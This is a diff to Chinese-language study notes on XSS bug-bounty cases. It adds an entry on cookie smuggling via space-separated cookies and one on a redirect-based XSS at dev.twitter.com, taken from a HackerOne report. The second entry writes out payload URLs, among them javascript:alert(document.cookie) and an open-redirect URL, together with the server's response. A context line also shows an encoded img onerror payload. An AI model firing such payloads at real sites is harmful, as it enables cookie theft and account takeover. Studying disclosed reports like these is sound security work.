@@ -100,5 +100,32 @@ https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxxx&quotonerror=&quot
 
 # 11.服务器错误处理cookie导致xss
 https://wx.zsxq.com/columns/48884815425228
+
+标题是：通过观察响应值以及**cookie走私**来实现的xss
 本来cookie中的字段以分号相隔为不同的cookie字段，但是这里服务器把空格也当成了分隔符，当攻击者用空格进行构造cookie的时候，服务器没有进行安全处理直接将cookie字段反射到页面造成xss
+后续还有账号接管操作还没分析
 思考：新的漏洞点，关注cookie等可能的header头也会有xss反射点
+
+# 12.路径重定向的xss
+https://hackerone.com/reports/260744
+
+
+
+```
+https://dev.twitter.com/https:/%5cblackfan.ru/
+后面https那个路径会进行重定向到https:/%5cblackfan.ru/
+```
+
+https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
+以下是http响应
+```
+HTTP/1.1 302 Found
+connection: close
+...
+location: //x:1/://dev.twitter.com/javascript:alert(document.cookie)
+...
+
+
+<p>You should be redirected automatically to target URL: <a href="javascript:alert(document.cookie)">javascript:alert(document.cookie)</a>.  If not click the link.
+```
+思考：提示重定向的页面也可以造成xss
